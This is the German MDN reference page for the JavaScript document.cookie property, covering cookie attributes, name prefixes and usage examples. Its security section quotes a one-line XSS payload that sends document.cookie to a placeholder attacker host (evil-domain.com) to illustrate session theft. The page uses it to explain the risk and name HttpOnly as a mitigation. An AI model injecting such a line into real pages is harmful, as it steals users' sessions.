---
title: "Dokument: cookie-Eigenschaft"
short-title: cookie
slug: Web/API/Document/cookie
l10n:
  sourceCommit: 5ef5a171a41dbcb48c953cc3c98c1237566796e9
---

{{APIRef("DOM")}}

Die [`Document`](/de/docs/Web/API/Document)-Eigenschaft `cookie` ermöglicht das Lesen und Schreiben von [Cookies](/de/docs/Web/HTTP/Guides/Cookies), die mit dem Dokument verknüpft sind.
Sie dient als Getter und Setter für die tatsächlichen Werte der Cookies.

> [!NOTE]
> Das `document.cookie` kann eine Quelle von Leistungsproblemen sein, da es sich um eine synchrone API handelt, die den Haupt-Thread blockiert, wenn Cookies über Prozesse hinweg gelesen oder I/O-Operationen durchgeführt werden. Entwickler sollten nach Möglichkeit die asynchrone [Cookie Store API](/de/docs/Web/API/Cookie_Store_API) verwenden, um Cookies zu verwalten.

## Wert

Ein String, der eine durch Semikolon getrennte Liste aller Cookies (d.h. `key=value`-Paare) enthält.
Beachten Sie, dass jedes _key_ und _value_ von Leerzeichen (Leer- und Tabulatorzeichen) umgeben sein kann: Tatsächlich verlangt {{RFC(6265)}} ein einzelnes Leerzeichen nach jedem Semikolon, aber einige User Agents halten sich möglicherweise nicht daran.

Sie können dieser Eigenschaft auch einen String in der Form `"key=value"` zuweisen, um das Cookie festzulegen/zu aktualisieren. Beachten Sie, dass Sie mit dieser Methode nur ein einziges Cookie gleichzeitig festlegen/aktualisieren können. Berücksichtigen Sie auch, dass:

- Jeder der folgenden Cookie-Attributwerte optional auf das Schlüssel-Wert-Paar folgen kann, wobei jeder durch ein Semikolon getrennt ist:
  - `;domain=domain` (z.B. `example.com` oder `subdomain.example.com`): Der Host, an den das Cookie gesendet wird.
    Wenn nicht angegeben, ist der Standard der Hostanteil des aktuellen Dokumentstandorts, und das Cookie ist auf Subdomains nicht verfügbar.
    Wenn eine Domain angegeben ist, sind Subdomains immer enthalten.
    Entgegen früherer Spezifikationen werden führende Punkte in Domainnamen ignoriert, aber Browser können es ablehnen, das Cookie zu setzen, das solche Punkte enthält.

    > [!NOTE]
    > Die Domain _muss_ mit der Domain des JavaScript-Ursprungs übereinstimmen.
    > Cookies, die auf fremde Domains gesetzt werden, werden stillschweigend ignoriert.

  - `;expires=date-in-UTCString-format`: Das Ablaufdatum des Cookies. Wenn weder `expires` noch `max-age` angegeben ist, läuft es am Ende der Sitzung ab.

    > [!WARNING]
    > Wenn der Schutz der Privatsphäre der Benutzer eine Rolle spielt, ist es wichtig, dass jede Webanwendung die Cookie-Daten nach einer bestimmten Zeitspanne ungültig macht, anstatt sich darauf zu verlassen, dass der Browser dies tut.
    > Viele Browser erlauben es Benutzern, anzugeben, dass Cookies niemals ablaufen sollten, was nicht unbedingt sicher ist.

    Siehe {{jsxref("Date.toUTCString()")}} für Hilfe beim Formatieren dieses Werts.

  - `;max-age=max-age-in-seconds`: Die maximale Lebensdauer des Cookies in Sekunden (z.B. `60*60*24*365` oder 31536000 für ein Jahr).

  - `;partitioned`: Gibt an, dass das Cookie in partitioniertem Speicher gespeichert werden soll. Weitere Details finden Sie unter [Cookies Having Independent Partitioned State (CHIPS)](/de/docs/Web/Privacy/Guides/Third-party_cookies/Partitioned_cookies).

  - `;path=path`: Der Wert des `Path`-Attributs des Cookies (siehe [Definieren, wo Cookies gesendet werden](/de/docs/Web/HTTP/Guides/Cookies#define_where_cookies_are_sent) für weitere Informationen).

  - `;samesite`: Das `SameSite`-Attribut eines {{httpheader("Set-Cookie")}}-Headers kann von einem Server gesetzt werden, um festzulegen, wann das Cookie gesendet wird. Mögliche Werte sind `lax`, `strict` oder `none` (siehe auch [Steuerung von Drittanbieter-Cookies mit `SameSite`](/de/docs/Web/HTTP/Guides/Cookies#controlling_third-party_cookies_with_samesite)).
    - Der Wert `lax` sendet das Cookie für alle gleichseitigen Anfragen und Navigations-GET-Anfragen auf oberster Ebene.
      Dies reicht aus, um Benutzer zu verfolgen, verhindert aber viele {{Glossary("CSRF", "Cross-Site Request Forgery")}} (CSRF)-Angriffe.
      Dies ist der Standardwert in modernen Browsern.
    - Der Wert `strict` verhindert, dass das Cookie vom Browser an die Zielsite in allen plattformübergreifenden Browsing-Kontexten gesendet wird, selbst beim Folgen eines regulären Links.
    - Der Wert `none` gibt ausdrücklich an, dass keine Einschränkungen angewendet werden.
      Das Cookie wird bei allen Anfragen gesendet – sowohl plattformübergreifend als auch gleichseitig.

  - `;secure`: Gibt an, dass das Cookie nur über ein sicheres Protokoll übertragen werden sollte.

- Der Cookie-Wert-String kann {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} verwenden, um sicherzustellen, dass der String keine Kommas, Semikolons oder Leerzeichen enthält (die in Cookie-Werten nicht zulässig sind).
- Der Cookie-Name kann ein Präfix haben, das bei unterstützenden User Agents spezifische Einschränkungen auf die Attribute des Cookies imposiert. Alle Cookie-Präfixe beginnen mit einem doppelten Unterstrich (`__`) und enden mit einem Bindestrich (`-`). Die folgenden Präfixe sind definiert:
  - **`__Secure-`**: Cookies mit Namen, die mit `__Secure-` beginnen, müssen mit dem `Secure`-Attribut von einer sicheren Seite (HTTPS) gesetzt werden.
  - **`__Host-`**: Cookies mit Namen, die mit `__Host-` beginnen, müssen mit dem `Secure`-Attribut von einer sicheren Seite (HTTPS) gesetzt werden. Außerdem dürfen sie kein `Domain`-Attribut angegeben haben, und das `Path`-Attribut muss auf `/` gesetzt sein. Dies garantiert, dass solche Cookies nur an den Host gesendet werden, der sie gesetzt hat, und nicht an einen anderen Host auf der Domain. Es garantiert auch, dass sie hostweit gesetzt werden und auf keinem Pfad auf diesem Host überschrieben werden können. Diese Kombination ergibt ein Cookie, das so nah wie möglich daran ist, den Ursprung als Sicherheitsgrenze zu behandeln.
  - **`__Http-`**: Cookies mit Namen, die mit `__Http-` beginnen, müssen mit dem `Secure`-Flag von einer sicheren Seite (HTTPS) gesetzt werden und außerdem muss das `HttpOnly`-Attribut gesetzt sein, um zu beweisen, dass sie über den `Set-Cookie`-Header gesetzt wurden (sie können nicht über JavaScript-Funktionen wie `Document.cookie` oder die [Cookie Store API](/de/docs/Web/API/Cookie_Store_API) gesetzt oder geändert werden).
  - **`__Host-Http-`**: Cookies mit Namen, die mit `__Host-Http-` beginnen, müssen mit dem `Secure`-Flag von einer sicheren Seite (HTTPS) gesetzt werden und müssen das `HttpOnly`-Attribut gesetzt haben, um zu beweisen, dass sie über den `Set-Cookie`-Header gesetzt wurden. Darüber hinaus haben sie auch die gleichen Einschränkungen wie Cookies mit `__Host-`-Präfix. Diese Kombination ergibt ein Cookie, das so nah wie möglich daran ist, den Ursprung als Sicherheitsgrenze zu behandeln und gleichzeitig sicherzustellen, dass Entwicklern und Serverbetreibern klar ist, dass sein Umfang auf HTTP-Anfragen beschränkt ist.

  > [!NOTE]
  > Der Bindestrich wird als Teil des Präfixes betrachtet.

  > [!NOTE]
  > Diese Flags können nur mit dem `secure`-Attribut gesetzt werden.

> [!NOTE]
> Die `document.cookie`-Eigenschaft ist eine [Accessor-Eigenschaft](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit nativen _Setter_- und _Getter_-Funktionen und ist folglich _keine_ [Daten-Eigenschaft](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit einem Wert: was Sie schreiben, ist nicht dasselbe wie das, was Sie lesen, alles wird immer vom JavaScript-Interpreter vermittelt.

## Beispiele

### Beispiel 1: Einfache Nutzung

```html
<button id="show">Show cookies</button>
<button id="clear">Clear</button>
<div>
  <code id="cookie-value"></code>
</div>
```

```js
const showBtn = document.getElementById("show");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("cookie-value");

// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "name=Oeschger; SameSite=None; Secure";
document.cookie = "favorite_food=tripe; SameSite=None; Secure";

showBtn.addEventListener("click", () => {
  output.textContent = `> ${document.cookie}`;
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_1_Simple_usage', 200, 72)}}

### Beispiel 2: Ein Beispiel-Cookie namens test2 abrufen

```html
<button id="show">Show cookie value</button>
<button id="clear">Clear</button>
<div>
  <code id="cookie-value"></code>
</div>
```

```js
const showBtn = document.getElementById("show");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("cookie-value");

// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "test1=Hello; SameSite=None; Secure";
document.cookie = "test2=World; SameSite=None; Secure";

showBtn.addEventListener("click", () => {
  const cookieValue = document.cookie
    .split("; ")
    .find((row) => row.startsWith("test2="))
    ?.split("=")[1];
  output.textContent = `> ${cookieValue}`;
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_2_Get_a_sample_cookie_named_test2', 200, 72)}}

### Beispiel 3: Etwas nur einmal tun

Um den folgenden Code zu verwenden, ersetzen Sie bitte alle Vorkommen des Wortes
`doSomethingOnlyOnce` (der Name des Cookies) durch einen benutzerdefinierten Namen.

```html
<button id="do-once">Only do something once</button>
<button id="clear">Clear</button>
<div>
  <code id="output"></code>
</div>
```

```js
const doOnceBtn = document.getElementById("do-once");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

doOnceBtn.addEventListener("click", () => {
  if (
    !document.cookie
      .split("; ")
      .find((row) => row.startsWith("doSomethingOnlyOnce"))
  ) {
    // Note that we are setting `SameSite=None;` in this example because the example
    // needs to work cross-origin.
    // It is more common not to set the `SameSite` attribute, which results in the default,
    // and more secure, value of `SameSite=Lax;`
    document.cookie =
      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";

    output.textContent = "> Do something here!";
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_3_Do_something_only_once', 200, 72)}}

### Beispiel 4: Das vorherige Cookie zurücksetzen

```html
<button id="reset">Reset only once cookie</button>
<button id="clear">Clear</button>
<div>
  <code id="output"></code>
</div>
```

```js
const resetBtn = document.getElementById("reset");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

resetBtn.addEventListener("click", () => {
  // Note that we are setting `SameSite=None;` in this example because the example
  // needs to work cross-origin.
  // It is more common not to set the `SameSite` attribute, which results in the default,
  // and more secure, value of `SameSite=Lax;`
  document.cookie =
    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure";

  const output = document.getElementById("reset-once");
  output.textContent = "> Reset!";
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_4_Reset_the_previous_cookie', 200, 72)}}

### Beispiel 5: Existenz eines Cookies überprüfen

```html
<button id="check">Check a cookie exists</button>
<button id="clear">Clear</button>
<div>
  <code id="output"></code>
</div>
```

```js
const checkBtn = document.getElementById("check");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "reader=1; SameSite=None; Secure";

checkBtn.addEventListener("click", () => {
  if (
    document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
  ) {
    output.textContent = '> The cookie "reader" exists';
  } else {
    output.textContent = '> The cookie "reader" does not exist';
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_5_Check_a_cookie_existence', 200, 72)}}

### Beispiel 6: Überprüfen, dass ein Cookie einen bestimmten Wert hat

```html
<button id="check">Check that a cookie has a specific value</button>
<button id="clear">Clear</button>
<div>
  <code id="output"></code>
</div>
```

```js
const checkBtn = document.getElementById("check");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

checkBtn.addEventListener("click", () => {
  if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
    output.textContent = '> The cookie "reader" has a value of "1"';
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_6_Check_that_a_cookie_has_a_specific_value', 200, 72)}}

## Sicherheit

Es ist wichtig zu beachten, dass das `path`-Attribut _nicht_ vor unbefugtem Lesen des Cookies von einem anderen Pfad schützt.
Es kann leicht umgangen werden, indem im DOM beispielsweise ein verstecktes {{HTMLElement("iframe")}}-Element mit dem Pfad des Cookies erstellt wird, dann auf die `contentDocument.cookie`-Eigenschaft dieses iframes zugegriffen wird.
Der einzige Weg, das Cookie zu schützen, besteht darin, eine andere Domain oder Subdomain zu verwenden, aufgrund der [Same-Origin-Policy](/de/docs/Web/Security/Defenses/Same-origin_policy).

Cookies werden häufig in Webanwendungen verwendet, um einen Benutzer und seine authentifizierte Sitzung zu identifizieren.
Das Stehlen eines Cookies von einer Webanwendung führt zur Entführung der authentifizierten Sitzung des Benutzers.
Häufige Methoden zum Stehlen von Cookies umfassen den Einsatz von [Social Engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) oder das Ausnutzen einer {{Glossary("Cross-site_scripting", "Cross-Site Scripting")}} (XSS)-Schwachstelle in der Anwendung -

```js
new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
```

Das `HTTPOnly`-Cookie-Attribut kann helfen, diesen Angriff zu mildern, indem es den Zugriff auf Cookie-Werte über JavaScript verhindert.
Lesen Sie mehr über [Cookies und Sicherheit](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).

## Hinweise

- Ab Firefox 2 ist ein besserer Mechanismus für die clientseitige Speicherung verfügbar - [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API).
- Sie können ein Cookie löschen, indem Sie seine Ablaufzeit auf null setzen.
- Bedenken Sie, dass je mehr Cookies Sie haben, desto mehr Daten zwischen dem Server und dem Client für jede Anfrage übertragen werden.
  Dies macht jede Anfrage langsamer.
  Es wird dringend empfohlen, [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API) zu verwenden, wenn Sie "nur klientseitige" Daten speichern möchten.
- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965) (Abschnitt 5.3, "Implementation Limits") gibt an, dass es **keine maximale Länge** für die Größe des Schlüssel- oder Wert-Strings eines Cookies geben sollte, und ermutigt Implementierungen, **beliebig große Cookies** zu unterstützen.
  Die maximale Implementierung in jedem Browser wird zwangsläufig unterschiedlich sein, daher konsultieren Sie die Dokumentation des jeweiligen Browsers.

Der Grund für die Asymmetrie zwischen dem Abrufen und Festlegen der `document.cookie`-Accessor-Eigenschaft liegt in der Client-Server-Natur von Cookies, die sich von anderen Client-Client-Speichermethoden unterscheidet (wie z.B. [localStorage](/de/docs/Web/API/Web_Storage_API)):

- Der Server weist den Client an, ein Cookie zu speichern:

  ```http
  HTTP/1.0 200 OK
  Content-type: text/html
  Set-Cookie: cookie_name1=cookie_value1
  Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT

  [content of the page here]
  ```

- Der Client sendet seine zuvor gespeicherten Cookies an den Server zurück:

  ```http
  GET /sample_page.html HTTP/1.1
  Host: www.example.org
  Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
  Accept: */*
  ```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [HTTP-Cookies](/de/docs/Web/HTTP/Guides/Cookies)
- [DOM Storage](/de/docs/Web/API/Web_Storage_API)
- [`URL.pathname`](/de/docs/Web/API/URL/pathname)
- {{jsxref("Date.toUTCString()")}}
- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965)
